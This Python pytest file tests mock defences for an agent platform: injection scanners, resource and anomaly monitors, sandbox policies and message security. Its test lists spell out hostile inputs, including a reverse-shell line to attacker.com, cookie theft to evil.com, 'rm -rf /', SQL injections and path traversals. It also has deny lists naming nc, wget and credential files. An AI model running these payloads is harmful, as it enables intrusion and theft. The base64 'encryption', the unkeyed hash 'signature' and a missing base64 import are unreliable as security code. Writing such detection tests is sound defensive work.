#!/usr/bin/env python3
"""
OSSA Malicious Agent Protection Security Tests

Tests for validating protection mechanisms against malicious agents including:
- Agent behavior anomaly detection
- Malicious code injection prevention
- Resource consumption monitoring and limits
- Unauthorized access prevention
- Command injection and execution protection
- Data exfiltration prevention
- Sandboxing and isolation validation
- Agent communication security
"""

import pytest
import asyncio
import time
import hashlib
import secrets
import json
import re
import subprocess
import tempfile
import os
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from typing import Dict, List, Any, Tuple, Optional
from dataclasses import dataclass, asdict
from enum import Enum
import threading
import psutil
from pathlib import Path

class ThreatLevel(Enum):
    """Threat level enumeration"""
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    CRITICAL = 4

class AttackType(Enum):
    """Attack type enumeration"""
    CODE_INJECTION = "code_injection"
    RESOURCE_EXHAUSTION = "resource_exhaustion"
    UNAUTHORIZED_ACCESS = "unauthorized_access"
    DATA_EXFILTRATION = "data_exfiltration"
    COMMAND_INJECTION = "command_injection"
    PRIVILEGE_ESCALATION = "privilege_escalation"

@dataclass
class SecurityAlert:
    """Security alert data structure"""
    alert_id: str
    agent_id: str
    threat_level: ThreatLevel
    attack_type: AttackType
    description: str
    timestamp: datetime
    evidence: Dict[str, Any]
    mitigation_action: str
    resolved: bool = False

@dataclass
class AgentBehaviorProfile:
    """Agent behavior profile for anomaly detection"""
    agent_id: str
    normal_cpu_usage: float
    normal_memory_usage: float
    normal_network_activity: float
    typical_response_time: float
    allowed_operations: List[str]
    risk_score: float

class TestMaliciousCodeInjectionPrevention:
    """Test protection against malicious code injection attacks"""

    @pytest.fixture
    def code_scanner(self):
        """Create mock code scanner for testing"""
        return self._create_code_scanner()

    def test_python_code_injection_detection(self, code_scanner):
        """Test detection of Python code injection attempts"""
        # Malicious Python code patterns
        malicious_codes = [
            "import os; os.system('rm -rf /')",
            "__import__('subprocess').call(['curl', 'evil.com'])",
            "exec(open('/etc/passwd').read())",
            "eval(input())",
            "compile(malicious_code, '<string>', 'exec')",
            "globals()['__builtins__']['eval']('malicious')",
            "getattr(__builtins__, 'exec')('malicious')"
        ]
        
        for malicious_code in malicious_codes:
            threat_detected, threat_level = code_scanner.scan_python_code(malicious_code)
            assert threat_detected, f"Failed to detect malicious Python code: {malicious_code}"
            assert threat_level >= ThreatLevel.HIGH, f"Threat level too low for: {malicious_code}"

    def test_javascript_code_injection_detection(self, code_scanner):
        """Test detection of JavaScript code injection attempts"""
        malicious_js_codes = [
            "document.location='http://evil.com/steal?cookie='+document.cookie",
            "new Function('return process.env')();",
            "require('child_process').exec('malicious_command')",
            "eval(atob('bWFsaWNpb3VzX2NvZGU='))",  # Base64 encoded
            "Function('r', 'e', 't', 'u', 'r', 'n', ' ', 'e', 'v', 'a', 'l')()('alert(1)')",
            "setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41), 100)"
        ]
        
        for malicious_code in malicious_js_codes:
            threat_detected, threat_level = code_scanner.scan_javascript_code(malicious_code)
            assert threat_detected, f"Failed to detect malicious JavaScript: {malicious_code}"
            assert threat_level >= ThreatLevel.HIGH, f"Threat level too low for: {malicious_code}"

    def test_sql_injection_detection(self, code_scanner):
        """Test detection of SQL injection attempts"""
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/**/OR/**/1=1#",
            "1; DELETE FROM accounts WHERE 1=1; --",
            "1' UNION SELECT username, password FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ]
        
        for injection in sql_injection_attempts:
            threat_detected, threat_level = code_scanner.scan_sql_input(injection)
            assert threat_detected, f"Failed to detect SQL injection: {injection}"
            assert threat_level >= ThreatLevel.HIGH, f"Threat level too low for: {injection}"

    def test_command_injection_detection(self, code_scanner):
        """Test detection of command injection attempts"""
        command_injections = [
            "test; rm -rf /",
            "filename | cat /etc/passwd",
            "input && curl evil.com",
            "data; nc -e /bin/sh attacker.com 4444",
            "file || wget evil.com/malware.sh",
            "input `whoami`",
            "data $(cat /etc/shadow)"
        ]
        
        for injection in command_injections:
            threat_detected, threat_level = code_scanner.scan_command_input(injection)
            assert threat_detected, f"Failed to detect command injection: {injection}"
            assert threat_level >= ThreatLevel.HIGH, f"Threat level too low for: {injection}"

    def test_path_traversal_detection(self, code_scanner):
        """Test detection of path traversal attempts"""
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "..%252f..%252f..%252fetc%252fpasswd",  # Double URL encoded
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"  # UTF-8 encoded
        ]
        
        for traversal in path_traversals:
            threat_detected, threat_level = code_scanner.scan_file_path(traversal)
            assert threat_detected, f"Failed to detect path traversal: {traversal}"
            assert threat_level >= ThreatLevel.MEDIUM, f"Threat level too low for: {traversal}"

    def _create_code_scanner(self):
        """Create mock code scanner"""
        class MockCodeScanner:
            def scan_python_code(self, code: str) -> Tuple[bool, ThreatLevel]:
                dangerous_patterns = [
                    r'import\s+os.*system',
                    r'__import__.*subprocess',
                    r'exec\s*\(',
                    r'eval\s*\(',
                    r'compile\s*\(',
                    r'globals\(\)',
                    r'getattr.*exec'
                ]
                
                for pattern in dangerous_patterns:
                    if re.search(pattern, code, re.IGNORECASE):
                        return True, ThreatLevel.CRITICAL
                
                return False, ThreatLevel.LOW
            
            def scan_javascript_code(self, code: str) -> Tuple[bool, ThreatLevel]:
                dangerous_patterns = [
                    r'document\.location',
                    r'new\s+Function',
                    r'require.*child_process',
                    r'eval\s*\(',
                    r'Function.*eval',
                    r'setTimeout.*String\.fromCharCode'
                ]
                
                for pattern in dangerous_patterns:
                    if re.search(pattern, code, re.IGNORECASE):
                        return True, ThreatLevel.HIGH
                
                return False, ThreatLevel.LOW
            
            def scan_sql_input(self, input_str: str) -> Tuple[bool, ThreatLevel]:
                sql_patterns = [
                    r"';?\s*(DROP|DELETE|INSERT|UPDATE|ALTER)",
                    r"'\s*(OR|AND)\s*'?\d*'?\s*=\s*'?\d",
                    r"UNION\s+SELECT",
                    r"--;?\s*$",
                    r"/\*.*\*/"
                ]
                
                for pattern in sql_patterns:
                    if re.search(pattern, input_str, re.IGNORECASE):
                        return True, ThreatLevel.HIGH
                
                return False, ThreatLevel.LOW
            
            def scan_command_input(self, input_str: str) -> Tuple[bool, ThreatLevel]:
                command_patterns = [
                    r'[;&|`$]',  # Command separators and substitution
                    r'rm\s+-rf',
                    r'nc\s+-e',
                    r'wget\s+\w+:',
                    r'curl\s+\w+:',
                    r'\$\(',  # Command substitution
                    r'`.*`'   # Backtick execution
                ]
                
                for pattern in command_patterns:
                    if re.search(pattern, input_str):
                        return True, ThreatLevel.CRITICAL
                
                return False, ThreatLevel.LOW
            
            def scan_file_path(self, path: str) -> Tuple[bool, ThreatLevel]:
                traversal_patterns = [
                    r'\.\./|\.\.\\',  # Directory traversal
                    r'%2e%2e%2f|%2e%2e%5c',  # URL encoded traversal
                    r'%252f|%255c',  # Double URL encoded
                    r'%c0%af'  # UTF-8 encoded
                ]
                
                for pattern in traversal_patterns:
                    if re.search(pattern, path, re.IGNORECASE):
                        return True, ThreatLevel.HIGH
                
                return False, ThreatLevel.LOW
        
        return MockCodeScanner()

class TestResourceConsumptionMonitoring:
    """Test monitoring and limiting of agent resource consumption"""

    @pytest.fixture
    def resource_monitor(self):
        """Create mock resource monitor"""
        return self._create_resource_monitor()

    def test_cpu_usage_monitoring(self, resource_monitor):
        """Test CPU usage monitoring and limits"""
        agent_id = f"test_agent_{secrets.token_hex(4)}"
        
        # Simulate normal CPU usage
        resource_monitor.record_cpu_usage(agent_id, 25.0)  # 25% CPU
        assert not resource_monitor.is_cpu_limit_exceeded(agent_id), "Normal CPU usage flagged as excessive"
        
        # Simulate excessive CPU usage
        resource_monitor.record_cpu_usage(agent_id, 95.0)  # 95% CPU
        assert resource_monitor.is_cpu_limit_exceeded(agent_id), "Excessive CPU usage not detected"

    def test_memory_usage_monitoring(self, resource_monitor):
        """Test memory usage monitoring and limits"""
        agent_id = f"test_agent_{secrets.token_hex(4)}"
        
        # Simulate normal memory usage
        resource_monitor.record_memory_usage(agent_id, 512 * 1024 * 1024)  # 512 MB
        assert not resource_monitor.is_memory_limit_exceeded(agent_id), "Normal memory usage flagged as excessive"
        
        # Simulate excessive memory usage
        resource_monitor.record_memory_usage(agent_id, 8 * 1024 * 1024 * 1024)  # 8 GB
        assert resource_monitor.is_memory_limit_exceeded(agent_id), "Excessive memory usage not detected"

    def test_network_activity_monitoring(self, resource_monitor):
        """Test network activity monitoring"""
        agent_id = f"test_agent_{secrets.token_hex(4)}"
        
        # Simulate normal network activity
        resource_monitor.record_network_activity(agent_id, bytes_sent=1024*100, bytes_received=1024*200)
        assert not resource_monitor.is_network_limit_exceeded(agent_id), "Normal network activity flagged as excessive"
        
        # Simulate excessive network activity (potential data exfiltration)
        resource_monitor.record_network_activity(agent_id, bytes_sent=1024*1024*100, bytes_received=1024*50)  # 100MB sent
        assert resource_monitor.is_network_limit_exceeded(agent_id), "Excessive network activity not detected"

    def test_file_system_access_monitoring(self, resource_monitor):
        """Test file system access monitoring"""
        agent_id = f"test_agent_{secrets.token_hex(4)}"
        
        # Simulate normal file access
        allowed_paths = ["/tmp/agent_workspace", "/var/log/agent.log"]
        for path in allowed_paths:
            resource_monitor.record_file_access(agent_id, path)
            assert resource_monitor.is_file_access_allowed(agent_id, path), f"Legitimate file access denied: {path}"
        
        # Simulate unauthorized file access
        forbidden_paths = ["/etc/passwd", "/root/.ssh/id_rsa", "/home/user/.aws/credentials"]
        for path in forbidden_paths:
            assert not resource_monitor.is_file_access_allowed(agent_id, path), f"Unauthorized file access permitted: {path}"

    def test_fork_bomb_detection(self, resource_monitor):
        """Test detection of fork bomb attacks"""
        agent_id = f"test_agent_{secrets.token_hex(4)}"
        
        # Simulate normal process creation
        for i in range(5):
            resource_monitor.record_process_creation(agent_id)
        assert not resource_monitor.is_fork_bomb_detected(agent_id), "Normal process creation flagged as fork bomb"
        
        # Simulate rapid process creation (fork bomb)
        for i in range(100):
            resource_monitor.record_process_creation(agent_id)
        assert resource_monitor.is_fork_bomb_detected(agent_id), "Fork bomb not detected"

    def _create_resource_monitor(self):
        """Create mock resource monitor"""
        class MockResourceMonitor:
            def __init__(self):
                self.cpu_usage = {}
                self.memory_usage = {}
                self.network_activity = {}
                self.file_accesses = {}
                self.process_creation_times = {}
                
                # Limits
                self.cpu_limit = 80.0  # 80% CPU
                self.memory_limit = 2 * 1024 * 1024 * 1024  # 2 GB
                self.network_limit = 10 * 1024 * 1024  # 10 MB per minute
                
                # Allowed paths
                self.allowed_path_patterns = [
                    r'^/tmp/agent_workspace',
                    r'^/var/log/agent\.log',
                    r'^/opt/ossa/agents'
                ]
            
            def record_cpu_usage(self, agent_id: str, cpu_percent: float):
                self.cpu_usage[agent_id] = cpu_percent
            
            def is_cpu_limit_exceeded(self, agent_id: str) -> bool:
                return self.cpu_usage.get(agent_id, 0) > self.cpu_limit
            
            def record_memory_usage(self, agent_id: str, memory_bytes: int):
                self.memory_usage[agent_id] = memory_bytes
            
            def is_memory_limit_exceeded(self, agent_id: str) -> bool:
                return self.memory_usage.get(agent_id, 0) > self.memory_limit
            
            def record_network_activity(self, agent_id: str, bytes_sent: int, bytes_received: int):
                if agent_id not in self.network_activity:
                    self.network_activity[agent_id] = {"sent": 0, "received": 0, "timestamp": time.time()}
                
                self.network_activity[agent_id]["sent"] += bytes_sent
                self.network_activity[agent_id]["received"] += bytes_received
            
            def is_network_limit_exceeded(self, agent_id: str) -> bool:
                if agent_id not in self.network_activity:
                    return False
                
                activity = self.network_activity[agent_id]
                total_bytes = activity["sent"] + activity["received"]
                time_elapsed = time.time() - activity["timestamp"]
                
                # Check if rate exceeds limit (bytes per second)
                if time_elapsed > 0:
                    rate = total_bytes / time_elapsed
                    return rate > (self.network_limit / 60)  # Convert to per-second limit
                
                return False
            
            def record_file_access(self, agent_id: str, file_path: str):
                if agent_id not in self.file_accesses:
                    self.file_accesses[agent_id] = []
                self.file_accesses[agent_id].append(file_path)
            
            def is_file_access_allowed(self, agent_id: str, file_path: str) -> bool:
                for pattern in self.allowed_path_patterns:
                    if re.match(pattern, file_path):
                        return True
                return False
            
            def record_process_creation(self, agent_id: str):
                if agent_id not in self.process_creation_times:
                    self.process_creation_times[agent_id] = []
                
                current_time = time.time()
                self.process_creation_times[agent_id].append(current_time)
                
                # Keep only recent process creation times (last minute)
                cutoff_time = current_time - 60
                self.process_creation_times[agent_id] = [
                    t for t in self.process_creation_times[agent_id] if t > cutoff_time
                ]
            
            def is_fork_bomb_detected(self, agent_id: str) -> bool:
                if agent_id not in self.process_creation_times:
                    return False
                
                recent_processes = len(self.process_creation_times[agent_id])
                return recent_processes > 50  # More than 50 processes in last minute
        
        return MockResourceMonitor()

class TestAgentBehaviorAnomalyDetection:
    """Test anomaly detection in agent behavior patterns"""

    @pytest.fixture
    def anomaly_detector(self):
        """Create mock anomaly detector"""
        return self._create_anomaly_detector()

    @pytest.fixture
    def normal_behavior_profile(self):
        """Create normal behavior profile"""
        return AgentBehaviorProfile(
            agent_id="normal_agent",
            normal_cpu_usage=15.0,
            normal_memory_usage=256*1024*1024,  # 256 MB
            normal_network_activity=1024*10,  # 10 KB/min
            typical_response_time=200.0,  # 200ms
            allowed_operations=["read", "analyze", "report"],
            risk_score=0.2
        )

    def test_cpu_usage_anomaly_detection(self, anomaly_detector, normal_behavior_profile):
        """Test detection of CPU usage anomalies"""
        # Normal CPU usage should not trigger anomaly
        is_anomaly, confidence = anomaly_detector.detect_cpu_anomaly(
            normal_behavior_profile, current_cpu=18.0
        )
        assert not is_anomaly, "Normal CPU usage flagged as anomaly"
        
        # Abnormal CPU spike should trigger anomaly
        is_anomaly, confidence = anomaly_detector.detect_cpu_anomaly(
            normal_behavior_profile, current_cpu=85.0
        )
        assert is_anomaly, "CPU spike not detected as anomaly"
        assert confidence > 0.8, "Low confidence in CPU anomaly detection"

    def test_memory_usage_anomaly_detection(self, anomaly_detector, normal_behavior_profile):
        """Test detection of memory usage anomalies"""
        # Normal memory usage
        is_anomaly, confidence = anomaly_detector.detect_memory_anomaly(
            normal_behavior_profile, current_memory=280*1024*1024  # 280 MB
        )
        assert not is_anomaly, "Normal memory usage flagged as anomaly"
        
        # Abnormal memory consumption
        is_anomaly, confidence = anomaly_detector.detect_memory_anomaly(
            normal_behavior_profile, current_memory=2*1024*1024*1024  # 2 GB
        )
        assert is_anomaly, "Memory spike not detected as anomaly"
        assert confidence > 0.9, "Low confidence in memory anomaly detection"

    def test_network_behavior_anomaly_detection(self, anomaly_detector, normal_behavior_profile):
        """Test detection of network behavior anomalies"""
        # Normal network activity
        is_anomaly, confidence = anomaly_detector.detect_network_anomaly(
            normal_behavior_profile, current_network=12*1024  # 12 KB
        )
        assert not is_anomaly, "Normal network activity flagged as anomaly"
        
        # Suspicious network activity (potential data exfiltration)
        is_anomaly, confidence = anomaly_detector.detect_network_anomaly(
            normal_behavior_profile, current_network=100*1024*1024  # 100 MB
        )
        assert is_anomaly, "Suspicious network activity not detected as anomaly"

    def test_response_time_anomaly_detection(self, anomaly_detector, normal_behavior_profile):
        """Test detection of response time anomalies"""
        # Normal response time
        is_anomaly, confidence = anomaly_detector.detect_response_time_anomaly(
            normal_behavior_profile, current_response_time=220.0
        )
        assert not is_anomaly, "Normal response time flagged as anomaly"
        
        # Suspicious slow response (potential resource exhaustion attack)
        is_anomaly, confidence = anomaly_detector.detect_response_time_anomaly(
            normal_behavior_profile, current_response_time=5000.0  # 5 seconds
        )
        assert is_anomaly, "Slow response time not detected as anomaly"

    def test_unauthorized_operation_detection(self, anomaly_detector, normal_behavior_profile):
        """Test detection of unauthorized operations"""
        # Allowed operations
        for operation in normal_behavior_profile.allowed_operations:
            is_unauthorized = anomaly_detector.detect_unauthorized_operation(
                normal_behavior_profile, operation
            )
            assert not is_unauthorized, f"Authorized operation flagged as unauthorized: {operation}"
        
        # Unauthorized operations
        unauthorized_ops = ["delete", "admin", "execute", "system"]
        for operation in unauthorized_ops:
            is_unauthorized = anomaly_detector.detect_unauthorized_operation(
                normal_behavior_profile, operation
            )
            assert is_unauthorized, f"Unauthorized operation not detected: {operation}"

    def _create_anomaly_detector(self):
        """Create mock anomaly detector"""
        class MockAnomalyDetector:
            def detect_cpu_anomaly(self, profile: AgentBehaviorProfile, current_cpu: float) -> Tuple[bool, float]:
                # Anomaly if current usage is more than 3x normal
                threshold = profile.normal_cpu_usage * 3
                if current_cpu > threshold:
                    confidence = min(1.0, (current_cpu - threshold) / threshold)
                    return True, confidence
                return False, 0.0
            
            def detect_memory_anomaly(self, profile: AgentBehaviorProfile, current_memory: int) -> Tuple[bool, float]:
                # Anomaly if current usage is more than 5x normal
                threshold = profile.normal_memory_usage * 5
                if current_memory > threshold:
                    confidence = min(1.0, (current_memory - threshold) / threshold)
                    return True, confidence
                return False, 0.0
            
            def detect_network_anomaly(self, profile: AgentBehaviorProfile, current_network: int) -> Tuple[bool, float]:
                # Anomaly if current usage is more than 10x normal
                threshold = profile.normal_network_activity * 10
                if current_network > threshold:
                    confidence = min(1.0, (current_network - threshold) / threshold)
                    return True, confidence
                return False, 0.0
            
            def detect_response_time_anomaly(self, profile: AgentBehaviorProfile, current_response_time: float) -> Tuple[bool, float]:
                # Anomaly if response time is more than 10x normal
                threshold = profile.typical_response_time * 10
                if current_response_time > threshold:
                    confidence = min(1.0, (current_response_time - threshold) / threshold)
                    return True, confidence
                return False, 0.0
            
            def detect_unauthorized_operation(self, profile: AgentBehaviorProfile, operation: str) -> bool:
                return operation not in profile.allowed_operations
        
        return MockAnomalyDetector()

class TestSandboxingAndIsolation:
    """Test sandboxing and isolation security mechanisms"""

    def test_file_system_isolation(self):
        """Test file system access isolation"""
        sandbox = self._create_sandbox()
        
        # Agent should only access files within its sandbox
        agent_id = f"test_agent_{secrets.token_hex(4)}"
        sandbox_path = f"/tmp/sandbox_{agent_id}"
        
        # Create mock sandbox
        sandbox.create_agent_sandbox(agent_id, sandbox_path)
        
        # Test allowed file access within sandbox
        allowed_file = f"{sandbox_path}/test_file.txt"
        assert sandbox.is_file_access_allowed(agent_id, allowed_file), "Sandbox file access denied"
        
        # Test forbidden file access outside sandbox
        forbidden_file = "/etc/passwd"
        assert not sandbox.is_file_access_allowed(agent_id, forbidden_file), "Outside sandbox file access allowed"

    def test_network_isolation(self):
        """Test network access isolation"""
        sandbox = self._create_sandbox()
        agent_id = f"test_agent_{secrets.token_hex(4)}"
        
        # Configure network restrictions
        allowed_hosts = ["api.ossa.platform", "trusted-service.com"]
        blocked_hosts = ["malicious.com", "attacker.evil"]
        
        sandbox.configure_network_policy(agent_id, allowed_hosts, blocked_hosts)
        
        # Test allowed network access
        for host in allowed_hosts:
            assert sandbox.is_network_access_allowed(agent_id, host), f"Allowed network access denied: {host}"
        
        # Test blocked network access
        for host in blocked_hosts:
            assert not sandbox.is_network_access_allowed(agent_id, host), f"Blocked network access permitted: {host}"

    def test_process_isolation(self):
        """Test process isolation and privilege restrictions"""
        sandbox = self._create_sandbox()
        agent_id = f"test_agent_{secrets.token_hex(4)}"
        
        # Configure process restrictions
        allowed_commands = ["python3", "node", "curl"]
        blocked_commands = ["sudo", "rm", "dd", "nc", "wget"]
        
        sandbox.configure_process_policy(agent_id, allowed_commands, blocked_commands)
        
        # Test allowed commands
        for command in allowed_commands:
            assert sandbox.is_command_allowed(agent_id, command), f"Allowed command blocked: {command}"
        
        # Test blocked commands
        for command in blocked_commands:
            assert not sandbox.is_command_allowed(agent_id, command), f"Blocked command permitted: {command}"

    def test_resource_limits_enforcement(self):
        """Test enforcement of resource limits in sandbox"""
        sandbox = self._create_sandbox()
        agent_id = f"test_agent_{secrets.token_hex(4)}"
        
        # Configure resource limits
        limits = {
            "max_cpu_percent": 50,
            "max_memory_mb": 512,
            "max_disk_mb": 1024,
            "max_processes": 10,
            "max_open_files": 100
        }
        
        sandbox.set_resource_limits(agent_id, limits)
        
        # Test resource limit validation
        assert sandbox.get_cpu_limit(agent_id) == 50, "CPU limit not set correctly"
        assert sandbox.get_memory_limit(agent_id) == 512 * 1024 * 1024, "Memory limit not set correctly"
        assert sandbox.get_process_limit(agent_id) == 10, "Process limit not set correctly"

    def _create_sandbox(self):
        """Create mock sandbox environment"""
        class MockSandbox:
            def __init__(self):
                self.agent_sandboxes = {}
                self.network_policies = {}
                self.process_policies = {}
                self.resource_limits = {}
            
            def create_agent_sandbox(self, agent_id: str, sandbox_path: str):
                self.agent_sandboxes[agent_id] = {
                    "path": sandbox_path,
                    "created": datetime.utcnow()
                }
            
            def is_file_access_allowed(self, agent_id: str, file_path: str) -> bool:
                if agent_id not in self.agent_sandboxes:
                    return False
                
                sandbox_path = self.agent_sandboxes[agent_id]["path"]
                return file_path.startswith(sandbox_path)
            
            def configure_network_policy(self, agent_id: str, allowed_hosts: List[str], blocked_hosts: List[str]):
                self.network_policies[agent_id] = {
                    "allowed": allowed_hosts,
                    "blocked": blocked_hosts
                }
            
            def is_network_access_allowed(self, agent_id: str, host: str) -> bool:
                if agent_id not in self.network_policies:
                    return False
                
                policy = self.network_policies[agent_id]
                if host in policy["blocked"]:
                    return False
                
                return host in policy["allowed"]
            
            def configure_process_policy(self, agent_id: str, allowed_commands: List[str], blocked_commands: List[str]):
                self.process_policies[agent_id] = {
                    "allowed": allowed_commands,
                    "blocked": blocked_commands
                }
            
            def is_command_allowed(self, agent_id: str, command: str) -> bool:
                if agent_id not in self.process_policies:
                    return False
                
                policy = self.process_policies[agent_id]
                if command in policy["blocked"]:
                    return False
                
                return command in policy["allowed"]
            
            def set_resource_limits(self, agent_id: str, limits: Dict[str, int]):
                self.resource_limits[agent_id] = limits
            
            def get_cpu_limit(self, agent_id: str) -> int:
                return self.resource_limits.get(agent_id, {}).get("max_cpu_percent", 0)
            
            def get_memory_limit(self, agent_id: str) -> int:
                mb_limit = self.resource_limits.get(agent_id, {}).get("max_memory_mb", 0)
                return mb_limit * 1024 * 1024
            
            def get_process_limit(self, agent_id: str) -> int:
                return self.resource_limits.get(agent_id, {}).get("max_processes", 0)
        
        return MockSandbox()

class TestAgentCommunicationSecurity:
    """Test security of agent-to-agent communication"""

    def test_message_authentication(self):
        """Test message authentication between agents"""
        comm_security = self._create_communication_security()
        
        sender_id = "agent_sender"
        receiver_id = "agent_receiver"
        message = {"type": "collaboration_request", "data": "test data"}
        
        # Create authenticated message
        auth_message = comm_security.create_authenticated_message(sender_id, receiver_id, message)
        
        # Verify message authentication
        is_authentic, verified_sender = comm_security.verify_message_authentication(auth_message)
        assert is_authentic, "Authentic message failed verification"
        assert verified_sender == sender_id, "Message sender verification failed"
        
        # Test with tampered message
        tampered_message = auth_message.copy()
        tampered_message["data"]["content"] = "tampered data"
        
        is_authentic, _ = comm_security.verify_message_authentication(tampered_message)
        assert not is_authentic, "Tampered message passed verification"

    def test_message_encryption(self):
        """Test message encryption in agent communication"""
        comm_security = self._create_communication_security()
        
        sender_id = "agent_sender"
        receiver_id = "agent_receiver"
        sensitive_message = {"secret": "confidential_data", "api_key": "secret_key_123"}
        
        # Encrypt message
        encrypted_message = comm_security.encrypt_message(sender_id, receiver_id, sensitive_message)
        
        # Message should be encrypted (not readable)
        assert "secret" not in str(encrypted_message), "Message not properly encrypted"
        assert "api_key" not in str(encrypted_message), "Sensitive data visible in encrypted message"
        
        # Decrypt message
        decrypted_message = comm_security.decrypt_message(receiver_id, encrypted_message)
        
        # Decrypted message should match original
        assert decrypted_message == sensitive_message, "Message decryption failed"

    def test_replay_attack_prevention(self):
        """Test prevention of replay attacks in agent communication"""
        comm_security = self._create_communication_security()
        
        sender_id = "agent_sender"
        receiver_id = "agent_receiver"
        message = {"type": "command", "action": "execute_task"}
        
        # Create message with timestamp and nonce
        timestamped_message = comm_security.create_timestamped_message(sender_id, receiver_id, message)
        
        # First delivery should succeed
        is_valid, _ = comm_security.validate_message_freshness(timestamped_message)
        assert is_valid, "Fresh message failed validation"
        
        # Record message as processed
        comm_security.record_processed_message(timestamped_message)
        
        # Replay attempt should fail
        is_valid, reason = comm_security.validate_message_freshness(timestamped_message)
        assert not is_valid, "Replay attack not prevented"
        assert "replay" in reason.lower(), "Replay detection reason not provided"

    def test_unauthorized_agent_blocking(self):
        """Test blocking of unauthorized agents"""
        comm_security = self._create_communication_security()
        
        # Authorized agents
        authorized_agents = ["agent_A", "agent_B", "agent_C"]
        comm_security.set_authorized_agents(authorized_agents)
        
        # Test communication between authorized agents
        for agent in authorized_agents:
            assert comm_security.is_agent_authorized(agent), f"Authorized agent blocked: {agent}"
        
        # Test blocking of unauthorized agents
        unauthorized_agents = ["malicious_agent", "unknown_agent", "rogue_agent"]
        for agent in unauthorized_agents:
            assert not comm_security.is_agent_authorized(agent), f"Unauthorized agent permitted: {agent}"

    def _create_communication_security(self):
        """Create mock communication security system"""
        class MockCommunicationSecurity:
            def __init__(self):
                self.processed_messages = set()
                self.authorized_agents = set()
                self.agent_keys = {}  # Mock key storage
            
            def create_authenticated_message(self, sender_id: str, receiver_id: str, message: Dict[str, Any]) -> Dict[str, Any]:
                # Create message with authentication
                message_data = {
                    "sender": sender_id,
                    "receiver": receiver_id,
                    "data": message,
                    "timestamp": datetime.utcnow().isoformat(),
                    "nonce": secrets.token_hex(16)
                }
                
                # Add authentication signature
                message_str = json.dumps(message_data, sort_keys=True)
                signature = hashlib.sha256(f"{sender_id}:{message_str}".encode()).hexdigest()
                message_data["signature"] = signature
                
                return message_data
            
            def verify_message_authentication(self, message: Dict[str, Any]) -> Tuple[bool, Optional[str]]:
                try:
                    sender_id = message["sender"]
                    signature = message["signature"]
                    
                    # Recreate message without signature
                    message_copy = message.copy()
                    del message_copy["signature"]
                    
                    message_str = json.dumps(message_copy, sort_keys=True)
                    expected_signature = hashlib.sha256(f"{sender_id}:{message_str}".encode()).hexdigest()
                    
                    if signature == expected_signature:
                        return True, sender_id
                    else:
                        return False, None
                        
                except KeyError:
                    return False, None
            
            def encrypt_message(self, sender_id: str, receiver_id: str, message: Dict[str, Any]) -> Dict[str, Any]:
                # Mock encryption (in reality would use proper cryptography)
                message_str = json.dumps(message)
                encrypted_data = base64.b64encode(message_str.encode()).decode()
                
                return {
                    "sender": sender_id,
                    "receiver": receiver_id,
                    "encrypted_data": encrypted_data,
                    "encryption_method": "mock_aes_256"
                }
            
            def decrypt_message(self, receiver_id: str, encrypted_message: Dict[str, Any]) -> Dict[str, Any]:
                # Mock decryption
                if encrypted_message["receiver"] != receiver_id:
                    raise ValueError("Not authorized to decrypt message")
                
                encrypted_data = encrypted_message["encrypted_data"]
                message_str = base64.b64decode(encrypted_data.encode()).decode()
                
                return json.loads(message_str)
            
            def create_timestamped_message(self, sender_id: str, receiver_id: str, message: Dict[str, Any]) -> Dict[str, Any]:
                return {
                    "sender": sender_id,
                    "receiver": receiver_id,
                    "data": message,
                    "timestamp": datetime.utcnow().isoformat(),
                    "nonce": secrets.token_hex(16)
                }
            
            def validate_message_freshness(self, message: Dict[str, Any]) -> Tuple[bool, str]:
                message_id = f"{message['sender']}:{message['nonce']}:{message['timestamp']}"
                
                # Check if message already processed (replay detection)
                if message_id in self.processed_messages:
                    return False, "Message replay detected"
                
                # Check message age (should be recent)
                message_time = datetime.fromisoformat(message['timestamp'])
                age = datetime.utcnow() - message_time
                
                if age > timedelta(minutes=5):
                    return False, "Message too old"
                
                return True, "Message is fresh"
            
            def record_processed_message(self, message: Dict[str, Any]):
                message_id = f"{message['sender']}:{message['nonce']}:{message['timestamp']}"
                self.processed_messages.add(message_id)
            
            def set_authorized_agents(self, agents: List[str]):
                self.authorized_agents = set(agents)
            
            def is_agent_authorized(self, agent_id: str) -> bool:
                return agent_id in self.authorized_agents
        
        return MockCommunicationSecurity()

if __name__ == "__main__":
    pytest.main([__file__, "-v"])